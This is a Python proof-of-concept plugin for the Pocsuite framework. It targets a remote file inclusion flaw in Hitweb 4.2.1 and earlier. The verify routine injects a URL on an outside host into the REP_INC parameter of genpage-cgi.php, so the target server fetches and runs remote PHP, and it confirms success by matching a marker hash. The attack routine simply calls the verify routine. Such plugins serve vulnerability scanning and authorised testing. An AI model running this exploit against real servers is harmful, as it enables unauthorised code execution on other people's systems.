#!/usr/bin/env python
# coding: utf-8

import re
from pocsuite.net import req
from pocsuite.poc import Output, POCBase
from pocsuite.utils import register

class Hitweb_Remote_File_Include(POCBase):
    vulID = '63807'
    version = '1'
    vulDate = '2006-08-08'
    author = ' '
    createDate = '2015-12-17'
    updateDate = ' '
    references = ['http://www.sebug.net/vuldb/ssvid-63807']
    name = 'Hitweb <= 4.2.1 (REP_INC) Remote File Include Vulnerability'
    appPowerLink = 'http://freshmeat.net/redir/hitweb/15633/url_tgz/hitweb-4.2_php.tgz'
    appName = 'Hitweb'
    appVersion = '<= 4.2.1'
    vulType = 'Remote File Inclusion'
    desc = ''
    samples = ['']


    def _attack(self):
        return self._verify()


    def _verify(self):
        result = {}
        vul_url = '%s/genpage-cgi.php?REP_INC=http://tool.scanv.com/wsl/php_verify.txt?' % self.url
        response = req.get(vul_url).content

        if re.search('d4d7a6b8b3ed8ed86db2ef2cd728d8ec', response):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url


        return self.parse_attack(result)


    def parse_attack(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('failed')

        return output

register(Hitweb_Remote_File_Include)